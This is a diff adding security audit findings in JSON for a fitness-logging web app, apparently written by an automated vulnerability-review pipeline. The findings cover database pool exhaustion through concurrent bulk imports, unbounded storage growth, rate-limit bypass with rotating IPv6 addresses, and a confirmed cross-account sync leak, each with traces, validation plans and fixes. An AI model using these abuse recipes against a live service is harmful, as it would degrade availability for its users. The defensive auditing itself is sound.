+    "line": 94,
+    "description": "Unlimited anonymous routes already exist (/api/health, static, SPA fallback). The architecture notes rate limits are in-memory per instance, so a flood at this layer is not meaningfully blocked even for other routes."
+   }
+  ],
+  "reason": "No meaningful cross-boundary impact is demonstrated. The query is a fixed trivial `select 1` with no data exposure or state change. Pool exhaustion needs a sustained flood, which also saturates the unlimited static and health routes and is better handled at the platform edge. The scale-to-zero and cost concern rests on unobservable Neon and Cloud Run settings, and the endpoint exists for the deploy smoke check. Treat it as a hardening suggestion: add a small per-IP limit or a short cached result for /api/health/db, and fix the misleading comment at app.ts L118. I did not run it in the sandbox because the conclusion is source-level."
+ },
+ {
+  "verdict": "needs_validation",
+  "fingerprint": "import-legacy-20k-command-single-transaction-pins-shared-pool-connection",
+  "title": "import-legacy runs up to 20,000 commands in one transaction on one pooled DB connection with no timeouts, so a few concurrent requests from one signed-in account can exhaust the 10-connection pool",
+  "description": "POST /api/commands/import-legacy takes a body of up to 4 MB with up to 20,000 commands. Each command runs the real handler, several queries each, one after another, inside one inUserTransaction. That transaction holds one connection of a default pg.Pool (max 10, no connectionTimeout, statement_timeout or idle_in_transaction timeout configured in source). The same pool serves sessionAuth's ensure_user query on every /api request. The per-user import limiter allows 10 requests per hour, and concurrent requests are not limited. All of them check out a connection; the ones queued behind the first block on lockUser's `select ... for update` while still holding their connection. Ten parallel imports from one account can therefore hold the whole pool for as long as the first import runs. Other users' requests then wait indefinitely for a connection (no pool connectionTimeout), including sign-in lookups and /api/health/db. Making the last command invalid rolls the import back, so the account stays empty and can repeat in the next window. The source path is confirmed. How long a 20k-command import runs, and whether the deployed pooled Neon URL or role sets timeouts, cannot be observed from source. Postgres is unavailable in the sandbox, so I did not reproduce it.",
+  "claimed_root_cause": "The import is one unbounded-duration transaction on a shared, small, timeout-less pg pool, and the limiters count it as one request unit regardless of its cost or concurrency. There is no per-user in-flight cap, no statement or lock timeout, and no pool connectionTimeout.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "server/app.ts",
+    "line": 139,
+    "scope": "POST /api/commands/import-legacy handler",
+    "description": "Authenticated route; calls importLegacy with req.body. Any signed-in Google account (or dev header in dev/test) reaches it."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/app.ts",
+    "line": 90,
+    "scope": "createApp body parser",
+    "description": "express.json limit raised to 4mb for this route only."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/app.ts",
+    "line": 122,
+    "scope": "createApp rate limiters",
+    "description": "importLegacy limiter is 10 per hour per user (LIMITS at line 53) and counts requests, not concurrency or work done. The /api/commands limiter (600/min) also counts it as one unit."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/commands/importLegacy.ts",
+    "line": 50,
+    "scope": "items()",
+    "description": "Accepts 1 to MAX_IMPORT_COMMANDS (20,000) commands whose names are in HANDLERS."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/commands/importLegacy.ts",
+    "line": 79,
+    "scope": "importLegacy transaction",
+    "description": "lockUser does `select 1 from users ... for update` (support.ts:58-60); concurrent imports for the same user queue here while holding a pooled connection."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/commands/importLegacy.ts",
+    "line": 82,
+    "scope": "importLegacy loop",
+    "description": "Sequentially awaits each real handler inside one transaction on one pooled connection, with no time or work bound beyond the 20k count."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/db/connection.ts",
+    "line": 11,
+    "scope": "createDb",
+    "description": "new pg.Pool({connectionString, types}) with default max 10 and no connectionTimeoutMillis, statement_timeout or idle_in_transaction_session_timeout."
+   },
+   {
+    "kind": "sink",
+    "file": "server/auth.ts",
+    "line": 33,
+    "scope": "ensureUser/sessionAuth",
+    "description": "Every authenticated request needs a pool connection for ensure_user, so pool exhaustion blocks all users."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "server/commands/importLegacy.ts",
+    "line": 37,
+    "description": "MAX_IMPORT_COMMANDS = 20_000, described as 'a mistake cannot become a flood'; there is no time budget."
+   },
+   {
+    "file": "server/commands/importLegacy.ts",
+    "line": 80,
+    "description": "The non-empty check happens inside the transaction. A run that aborts on its last command rolls back and leaves the account empty, so it is repeatable."
+   },
+   {
+    "file": "server/commands/importLegacy.ts",
+    "line": 96,
+    "description": "After an Abort, the refusal is written in a second transaction (another connection checkout)."
+   },
+   {
+    "file": "server/app.ts",
+    "line": 53,
+    "description": "importLegacy limit is max 10 per 60 min per user via byUser (rateLimit.ts:21-40 is a plain request counter with no in-flight tracking)."
+   },
+   {
+    "file": "server/db/connection.ts",
+    "line": 11,
+    "description": "No pool max, connectionTimeoutMillis or statement timeout is set in source."
+   },
+   {
+    "file": "scripts/deploy-cloud-run.sh",
+    "line": 10,
+    "description": "Deploys with max-instances=1, so one instance and one 10-connection pool serve all users. The APP_DATABASE_URL is the pooled Neon URL, whose options (statement_timeout, role settings) are not in the repo."
+   },
+   {
+    "file": "server/commands/bodyWeight.ts",
+    "line": 36,
+    "description": "Handlers call lockUser again and run several queries per command, so 20k commands means roughly 100k round trips."
+   }
+  ],
+  "blockers": [
+   "Import wall-clock time for a 20,000-command payload against the deployed Cloud Run to Neon pooled path is unknown. Per-query latency decides whether the pool is held for seconds or minutes.",
+   "The deployed APP_DATABASE_URL, role or database may set statement_timeout, lock_timeout or idle_in_transaction_session_timeout (outside the repo), which would bound or kill the held connections.",
+   "Local reproduction needs Postgres with the migrations applied; the sandbox has no network or database, so no run was possible.",
+   "Whether sign-up is open to arbitrary Google accounts (it determines the attacker population). Source shows only that any valid Better Auth session passes sessionAuth."
+  ],
+  "validation_plan": {
+   "local": "On a scratch local Postgres with migrations applied, using a dedicated test user and the dev header: build a 20,000-command payload of valid log-body-weight (or other cheap create) commands with distinct keys and an invalid last command. Time one import. Then start the app with a small pool, send 10 concurrent import requests as one test user, and measure latency of GET /api/health/db and /api/me from a second user while they run. Record whether it hangs or returns 503, and the pg_stat_activity states (idle in transaction, waiting on the users row lock). Touch no deployed service.",
+   "deployment": "Owner-observed and non-destructive: on a staging or throwaway Neon branch with the same role and pooled URL, run the same timing with one import only. Check `SHOW statement_timeout`, `SHOW lock_timeout` and `SHOW idle_in_transaction_session_timeout` for the ironlog_app role. Do not run concurrent imports on the production database. Fix direction: cap in-flight imports per user (and globally) with a mutex or semaphore before taking a connection; set pool max, connectionTimeoutMillis, statement_timeout and lock_timeout; and chunk the import or bound it by time."
+  }
+ },
+ {
+  "verdict": "needs_validation",
+  "fingerprint": "per-user-unbounded-storage-row-history-refused-writes-no-retention",
+  "title": "Signed-in user can grow shared Postgres storage without a byte, row or retention cap",
+  "description": "The per-user limit counts requests (600 commands/min). It does not count bytes or rows. Three paths let one signed-in Google account add unbounded data. First, every UPDATE on a synced table fires record_row_history, which copies the entire old row into row_history, and nothing prunes that table. Second, each refused write stores up to about 100 KB of payload in refused_writes. A malformed envelope can trigger this with only a session; scrubbed() removes only entry.n, which does nothing for an arbitrary body, so the payload is stored essentially intact. Third, log_entries, library_items and list_items accept unlimited distinct client_ids. At the 600/min limit and up to 100 KB per request, a single account could add on the order of tens of MB per minute. The documented ceiling on the shared Neon database is not observable from source. The hunter's local check confirmed that a 100,868-byte body is kept as a 100,816-byte document. The code shows no per-user storage cap or retention job, and the project backlog lists refused-writes retention as an open decision. The user-facing erase_my_data function does remove a user's own history and refused rows, but an attacker would not call it.",
+  "claimed_root_cause": "Abuse control is request-rate only. The schema and commands have no per-user quota on rows or bytes, and no retention job for row_history or refused_writes. The history trigger copies the full row on every update, and the refusal path persists attacker-sized payloads.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "server/app.ts",
+    "line": 123,
+    "scope": "app.use('/api/commands', rateLimit(limits.commands, undefined, byUser))",
+    "description": "Any signed-in user may send 600 command requests per minute. The limit is on request count only and nothing limits bytes or stored rows."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/commands/documents.ts",
+    "line": 141,
+    "scope": "save()",
+    "description": "An invalid envelope or input calls refuse() and stores the request body in refused_writes. Each successful save of an existing row runs an UPDATE, which fires the history trigger."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/shared/config.ts",
+    "line": 41,
+    "scope": "normConfigDoc",
+    "description": "Config documents of about 100 KB are accepted. The hunter's local check kept 100,816 of 100,868 bytes. Nothing in the code caps the total document size beyond the 100 KB JSON body limit."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/commands/support.ts",
+    "line": 42,
+    "scope": "refuse()",
+    "description": "Inserts the JSON payload into refused_writes with no per-user cap, row cap or retention."
+   },
+   {
+    "kind": "propagation",
+    "file": "db/migrations/20261007000001_core_tables.sql",
+    "line": 70,
+    "scope": "record_row_history() trigger function",
+    "description": "Inserts to_jsonb(old), the full old row, into row_history on every UPDATE. No pruning exists."
+   },
+   {
+    "kind": "propagation",
+    "file": "db/migrations/20261007000006_library_items.sql",
+    "line": 23,
+    "scope": "library_items_user_client_id unique index",
+    "description": "Unique key is (user_id, client_id) with client_id up to 100 characters. A user can create unlimited distinct keys. The row-history trigger is attached to this table too."
+   },
+   {
+    "kind": "sink",
+    "file": "db/migrations/20261008000003_erase_and_delete_account.sql",
+    "line": 17,
+    "scope": "erase_my_data()",
+    "description": "The only deletion path is the user's own erase function, which uses SECURITY DEFINER. Nothing prunes data automatically."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "server/app.ts",
+    "line": 51,
+    "description": "Per-user limits are request counts only: commands 600 per 60,000 ms, sync 120 per minute, importLegacy 10 per hour."
+   },
+   {
+    "file": "server/app.ts",
+    "line": 91,
+    "description": "JSON body limit is 100 KB (line 90 sets 4 MB for import-legacy). This sets the per-request size, and there is no cumulative limit."
+   },
+   {
+    "file": "server/commands/support.ts",
+    "line": 32,
+    "description": "scrubbed() only removes the entry.n note field. The bad-envelope branch passes the raw body and the other branches pass the envelope input, so large payloads are persisted."
+   },
+   {
+    "file": "db/migrations/20261007000001_core_tables.sql",
+    "line": 70,
+    "description": "The trigger copies the whole old row into row_history. The index on replaced_at (line 67) would serve pruning, and no pruning job or code is present."
+   },
+   {
+    "file": "db/migrations/20261008000003_erase_and_delete_account.sql",
+    "line": 32,
+    "description": "erase_my_data deletes the user's own row_history and refused_writes (lines 32-33). It is not a retention mechanism."
+   }
+  ],
+  "blockers": [
+   "The Neon plan's storage ceiling and quota behavior are not observable from source or the sandbox, and this decides whether growth becomes an outage, a cost spike or a throttle.",
+   "Measuring row_history and refused_writes growth needs a live Postgres, and the offline sandbox has none.",
+   "Sign-in is open to any Google account, as the architecture indicates. The production registration policy cannot be verified from source."
+  ],
+  "validation_plan": {
+   "local": "On a scratch Postgres with the migrations applied, create one dummy user. Save a roughly 100 KB config document 100 times and send 100 invalid envelopes. Then compare pg_total_relation_size for row_history and refused_writes before and after, and extrapolate to 600 requests per minute.",
+   "deployment": "The owner should check the Neon project's storage limit and alerting. They should also check whether sign-up is restricted to an allowlist, and whether a periodic prune of row_history and refused_writes by replaced_at / received_at exists outside the repo."
+  }
+ },
+ {
+  "verdict": "needs_validation",
+  "fingerprint": "ratelimit-map-unbounded-fresh-keys-full-scan",
+  "title": "In-memory rate limiter sweeps its whole map on every request once more than 10,000 live per-IP keys exist, and a rotating IPv6 source gets a fresh bucket each time",
+  "description": "rateLimit() keeps one Map entry per client address, and it only removes entries whose window has expired. Once the map holds more than 10,000 entries, every request walks the entire map. If none of the entries have expired, that walk is pure overhead. The key is the full req.ip, so a caller with a routable IPv6 prefix can create a new entry on every request. Expired entries are only deleted by the sweep, so as long as the attacker keeps adding fresh keys inside one 60-second window the map stays large and every request, legitimate or not, pays the full-map scan on the single Node event loop. The hunter measured about 238us per request at 20k keys, about 1.25ms at 60k and about 1.8ms at 120k, against about 0.5us below the threshold. I did not re-run those timings. The map code and the threshold are visible in source, so the cost model is plausible. The same fresh-address behaviour also means the per-address limits never trigger, including the 10 per minute sign-in limit (server/app.ts:83). Two facts decide whether this is a real availability problem and I cannot see either from source: whether the deployed Cloud Run service accepts IPv6 clients (or lets an attacker get 10k or more distinct source addresses), and what X-Forwarded-For value Cloud Run's front end exposes to Express with trust proxy set to 1. The amplification is also modest. A normal request costs a few hundred microseconds, and the attacker must send roughly one request per fresh key from many addresses. Cloud Run autoscaling and per-instance maps further dilute the effect. If it holds, the impact is slower responses or event-loop starvation on one instance, plus weaker per-address throttling. It does not give access to data or accounts.",
+  "claimed_root_cause": "server/rateLimit.ts sweeps expired windows only when windows.size exceeds 10_000. It never evicts live keys and has no size cap. It keys on the raw req.ip, so IPv6 addresses are not grouped into /64 prefixes. Many fresh live keys therefore make every request do an O(n) scan, and let a client with many source addresses bypass the per-address limit.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "server/app.ts",
+    "line": 119,
+    "scope": "createApp, anonymous /api middleware",
+    "description": "app.use('/api', rateLimit(limits.api)) runs before sessionAuth, so unauthenticated requests reach the limiter. Auth routes (app.ts:83-84) and /api/client-errors (app.ts:88) use their own per-IP limiters of the same type."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/rateLimit.ts",
+    "line": 18,
+    "scope": "byIp",
+    "description": "The key is req.ip, the full address with no IPv6 prefix grouping, so one routable /64 yields effectively unlimited distinct keys."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/index.ts",
+    "line": 43,
+    "scope": "trustProxy configuration",
+    "description": "On Cloud Run (K_SERVICE set) trust proxy is 1, so req.ip is taken from the proxy-supplied X-Forwarded-For. This is the dependency on the deployed front end that I could not check."
+   },
+   {
+    "kind": "sink",
+    "file": "server/rateLimit.ts",
+    "line": 26,
+    "scope": "rateLimit handler, sweep",
+    "description": "When windows.size is above 10_000, every request iterates the whole Map. Only expired entries are removed, so when all keys are inside the window the scan is full cost every time and the map never shrinks."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "server/rateLimit.ts",
+    "line": 26,
+    "description": "Sweep condition and body: the full-map for loop, and deletion only of entries where t - w.start >= windowMs. Live entries are never evicted and there is no cap."
+   },
+   {
+    "file": "server/rateLimit.ts",
+    "line": 28,
+    "description": "A new Window is created for any unseen key at lines 28-32, so each distinct address adds one entry per limiter instance."
+   },
+   {
+    "file": "server/app.ts",
+    "line": 44,
+    "description": "AUTH_LIMITS: sign-in is 10 per 60s and other auth routes 120 per 60s. The api limiter is 1200 per 60s (app.ts:50). These per-address ceilings do not apply to a fresh address."
+   },
+   {
+    "file": "server/index.ts",
+    "line": 43,
+    "description": "trustProxy is 1 when K_SERVICE is set, so the client address comes from X-Forwarded-For as seen by the Cloud Run front end."
+   },
+   {
+    "file": "server/rateLimit.test.ts",
+    "line": 20,
+    "description": "The existing tests do not cover the map-size or sweep-cost behaviour."
+   }
+  ],
+  "blockers": [
+   "Whether the deployed Cloud Run URL accepts IPv6 clients, or whether an attacker can otherwise present more than 10,000 distinct req.ip values within one 60-second window. This is deployment and network routing, not visible in source.",
+   "What X-Forwarded-For the Cloud Run front end passes to the container, and whether an attacker-supplied value can end up as the last entry that Express trusts with trust proxy set to 1.",
+   "How much the measured scan cost (about 1.25ms per request at 60k keys) slows real traffic on a deployed instance, given its concurrency setting and autoscaling. The cost is per instance and the map is per process."
+  ],
+  "validation_plan": {
+   "local": "Start the real createApp with trustProxy set to 1 and a stubbed database, and use the existing server/rateLimit.test.ts pattern. Send requests with distinct X-Forwarded-For IPv6 values (2001:db8::N, N from 1 to 60000) in one fixed window, and record request latency before and after the map passes 10k keys. Confirm that sign-in requests from distinct addresses are never 429 while a repeated address is limited after 10 calls. Run it against a local instance only, with a small request count, no external network and no Postgres.",
+   "deployment": "The deployment owner checks the Cloud Run service's IPv6 reachability (for example whether the run.app hostname has AAAA records) and uses a harmless header-echo endpoint on a staging copy to see which X-Forwarded-For value the container receives. If either fact fails, close the finding. If both hold, cap the map size (for example evict the oldest entries when it exceeds a fixed bound) and key IPv6 addresses by /64 prefix."
+  }
+ },
+ {
+  "verdict": "confirmed",
+  "fingerprint": "sync.apiDb.gate-verified-latch-cross-account-mixing",
+  "title": "Sync gate latches 'verified' and never re-checks identity, so a tab keeps syncing after the browser's session switches to another account",
+  "description": "createApiDb checks who is signed in only until it sets verified=true. After that, gate() returns ok without calling identity() again. The flag is cleared only when sync pauses for 'auth' or 'account'. The session cookie is shared by every tab of the browser, and each request carries it with no user-id binding. If another tab of the same browser signs out and signs in as a different Google user, the already-open tab gets no 401. It does not reload, and its minute poll and wake events never re-run the identity check. From then on it sends the first user's unsent and new log entries to the second user's server account. It also pulls the second user's rows into the first user's mirror under the old cursor, and the status stays idle. The code's own comment at apiDb.ts:138-139 says this mixing is what the account check is meant to prevent. Impact is bounded: it needs a shared browser profile, the sync flag on, and a user-driven account switch in another tab.",
+  "root_cause": "The account-ownership check is a one-time latch (verified) rather than a per-request or per-session binding. Requests authenticate by ambient cookie only. Neither the client nor the API ties a request to the userId that was verified when the latch was set, so a cookie swap by another tab goes undetected.",
+  "intended_behavior": "A device holding one account's data must never send it to another account or merge another account's rows. Any change of the signed-in user, including one made in another tab, should pause sync with reason 'account' before the next send or pull.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "src/sync/browser.ts",
+    "line": 21,
+    "scope": "createBrowserApiDb",
+    "description": "Browser wiring. The wake and visibility handlers (line 21) and the 60s poll (apiDb.ts:422) call syncNow(). The only identity source is account.me, which reads the shared cookie session."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/sync/apiDb.ts",
+    "line": 152,
+    "scope": "gate",
+    "description": "Returns {ok:true} immediately when verified is true. identity() is not called again."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/sync/apiDb.ts",
+    "line": 132,
+    "scope": "setState",
+    "description": "verified is reset to false only on a pause for 'auth' or 'account'. A cookie switch to another valid user produces neither."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/sync/apiDb.ts",
+    "line": 238,
+    "scope": "pull",
+    "description": "Pull proceeds after the latched gate and merges the new session's rows into the old account's mirror."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/sync/transport.ts",
+    "line": 97,
+    "scope": "send",
+    "description": "Requests carry only the ambient cookie plus a dev header. There is no per-request user binding, so the server answers as whoever the cookie now names."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/sync/apiDb.ts",
+    "line": 292,
+    "scope": "flushPath",
+    "description": "Calls gate() on each loop pass. The latched gate passes and the outbox document is planned for sending."
+   },
+   {
+    "kind": "sink",
+    "file": "src/sync/apiDb.ts",
+    "line": 320,
+    "scope": "flushPath",
+    "description": "transport.command posts the first user's new log entry to the server under the second user's session. It is stored in the second user's account."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "src/sync/apiDb.ts",
+    "line": 152,
+    "description": "if (!options.identity || verified) return { ok: true } is the short-circuit that skips the identity check."
+   },
+   {
+    "file": "src/sync/apiDb.ts",
+    "line": 138,
+    "description": "The comment states the intent: a different account must not mix rows under one cursor or receive the first account's unsent change."
+   },
+   {
+    "file": "src/sync/account.ts",
+    "line": 26,
+    "description": "identity is /api/me with the same-origin cookie, called only while verified is false."
+   },
+   {
+    "file": "src/sync/browser.ts",
+    "line": 21,
+    "description": "Wake handlers call wake()/syncNow() but nothing resets verified or re-queries identity."
+   },
+   {
+    "file": "agents/ver-v10/artifacts/out/check-1.txt",
+    "line": 3,
+    "description": "Independent re-run of the hunter's harness in the sandbox: the fake bob server holds client id 'ann-private'. Ann's mirror shows bob's week row (done 'bobsecret:0'). Status is idle with pausedBecause null."
+   }
+  ],
+  "conditions": [
+   {
+    "kind": "system_configuration",
+    "description": "The sync flag (apiSync) is on. It is off by default and on in the Cloud Run build."
+   },
+   {
+    "kind": "user_interaction",
+    "description": "The same browser profile has two tabs open. In the other tab the user signs out and signs in as a different Google account, or signs in again, while the first tab stays open and makes no failing request."
+   },
+   {
+    "kind": "data_state",
+    "description": "The first tab has new or unsent log entries, or simply polls, after the switch."
+   }
+  ],
+  "execution": {
+   "attacker_perspective": "A second person (or the same person using a second Google account) on a shared browser profile signs in as account B in a new tab while account A's tab is still open and was previously verified. No network attacker is involved.",
+   "payloads": [
+    "fake server pair (ann, bob); bob's server has a week row for 2026-10-04",
+    "db.doc('logs/squat').set({schema:1,entries:[{id:'ann-private',...}]})"
+   ],
+   "instructions": [
+    "Start createApiDb with identity returning ann and a transport bound to the ann server, then run start().",
+    "Switch the transport's session to the bob server and identity to bob. This simulates the shared cookie changing without any 401 in this tab.",
+    "Call set() on a log document, then syncNow().",
+    "Read the bob server's rows and the doc('weeks/2026-10-04') snapshot."
+   ],
+   "observed_result": "Re-run in the sandbox (vitest, src/sync/zz_v10.test.ts, copied from the hunter's test). Bob's server holds client id 'ann-private'. Ann's snapshot of weeks/2026-10-04 contains bob's data ({prog:'B',done:{'bobsecret:0':true}}). Sync state is idle with pausedBecause null, and no account pause was raised. The harness stands in for the browser cookie and does not drive a real browser; the source shows requests carry only the cookie, so the same behavior follows."
+  },
+  "remediation": {
+   "strategy": "Re-verify identity on every send and pull, or on wake. For example, clear verified in the wake and visibilitychange handlers, and re-check on a timer. Better, bind each request to the verified user: send an x-expected-user header and have the API return 409/401 when it does not match the session user. The client then pauses with 'account' and the outbox is not sent.",
+   "code_changes": [
+    {
+     "file_name": "src/sync/apiDb.ts",
+     "fixed_code": "// in start(): unwake = options.onWake?.(() => { verified = false; wake(); void syncNow(); }) ?? null;\n// and in tick(): verified = false before syncNow() so each poll re-checks /api/me"
+    }
+   ]
+  },
+  "severity": {
+   "likelihood": {
+    "score": "low",
+    "reason": "Needs the sync flag on, two tabs of one browser profile, and a manual account switch in the other tab while the first stays open. Shared-profile account switching is uncommon."
+   },
+   "impact": {
+    "score": "medium",
+    "reason": "Cross-account confidentiality and integrity break on the device. One user's private logs are written into another user's server account, and the other user's rows appear in the first user's mirror. The user who performs the switch is the person at the device, and the scope is one dataset."
+   },
+   "overall_severity": "low"
+  },
+  "confidence": {
+   "score": "high",
+   "reason": "The source path is unambiguous: gate() short-circuits on verified, and the latch is cleared only on auth or account pauses. The harness reproduction was independent and matches the hunter's. The residual uncertainty is that real-browser cross-tab cookie behavior was not driven directly, but cookie sharing across tabs is standard."
+  }
+ }
+]
